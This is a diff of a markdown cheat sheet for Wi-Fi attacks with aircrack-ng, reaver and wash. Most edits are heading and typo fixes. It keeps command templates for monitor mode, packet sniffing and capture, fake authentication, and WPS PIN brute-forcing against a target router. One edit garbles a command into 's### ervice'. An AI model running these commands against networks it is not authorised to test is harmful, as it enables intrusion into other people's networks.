@@ -45,25 +45,25 @@ sudo su
 
 ## Network Manager Commands
 
- Kill Network Manager
+### Kill Network Manager
 
 ```
 airmon-ng check kill
 ```
 
- Enable Network Manager
+### Enable Network Manager
 
 ```
-service NetworkManager start
+s### ervice NetworkManager start
 ```
 
- Restart Network Manager
+### Restart Network Manager
 
 ```
 systemctl restart NetworkManager
 ```
 
- Check Status of Network Manager
+### Check Status of Network Manager
 
 ```
 systemctl status NetworkManager
@@ -71,9 +71,8 @@ systemctl status NetworkManager
 
 ---
 
-## Network Adapter Testing Commands
+# Network Adapter Testing Commands
 
- Enable Monitor Mode
 <details>
     <summary>Why we need to enable monitor mode ?</summary>
 we want is to be able to capture all the packets
@@ -83,23 +82,24 @@ and even if they are sent to another device.
 So to do this, we need to set our network adapter to the monitor mode
 </details>
 
+### Enable Monitor Mode
 ```
 airmon-ng start wlan1
 ```
 
- Disable Monitor Mode
+### Disable Monitor Mode
 
 ```
 airmon-ng stop wlan1
 ```
 
- Packet Injection test
+### Packet Injection test
 
 ```
 aireplay-ng --test wlan1
 ```
 
-Access Point Creation Test
+### Access Point Creation Test
 
 you can put any fake MAC Address like this `00:01:02:03:04:05`
 
@@ -222,25 +222,25 @@ it's channel, it's encryption,
 the clients connected to this network, and so on.
 </details>
 
- Sniff Network around `2.4 GHz`
+### Sniff Network around `2.4 GHz`
 
 ```
 airodump-ng wlan1
 ```
 
- Sniff Network Both `2.4 GHz and 5 GHz`
+### Sniff Network Both `2.4 GHz and 5 GHz`
 
 ```
 airodump-ng --band a wlan1
 ```
 
- Capture data both `2.4 GHz and 5 GHz`
+### Capture data both `2.4 GHz and 5 GHz`
 
 ```
 airodump-ng --band abg wlan1
 ```
 
- Capture data in a file `test`
+### Capture Data using `airodump-ng`
 
 ```
 airodump-ng --bssid {router_MAC_add} --channel {channel_no.} --write (file_name_without_extension) wlan1
@@ -352,7 +352,7 @@ ARP Request Replay<br />
 </details>
 
 ## 1. if target is busy
-First you need top capture data.
+First you need to capture data.
 
 ```
 airodump-ng --bssid {router_MAC_add} --channel {channel_no.} --write {file_name_without_extn} wlan1
@@ -429,16 +429,16 @@ not.<br/>
 
 ## 1. WPA / WPA2 Cracking `Without Word list`
 
- Scan WPS Enable Network Around us
+### Scan WPS Enable Network Around us
 
 ```
 wash --interface wlan1
 ```
 
-Fake-Authentication Attack
 > [!NOTE]\
 > do bottom two commands parlelly
 
+### Fake-Authentication Attack
 ```
 aireplay-ng --fakeauth {delay} -a {router_MAC_add} -h {your_NIC_MAC} wlan1
 ```
@@ -447,7 +447,7 @@ aireplay-ng --fakeauth {delay} -a {router_MAC_add} -h {your_NIC_MAC} wlan1
 >
 >I have added old version of `reaver` in my github repo.
 
-Brute force the pin
+### Brute force the pin attack
 ```
 reaver --bssid {router_MAC_add} --channel {channel_no.} --interface wlan1 -vvv --no-associate 
 ```
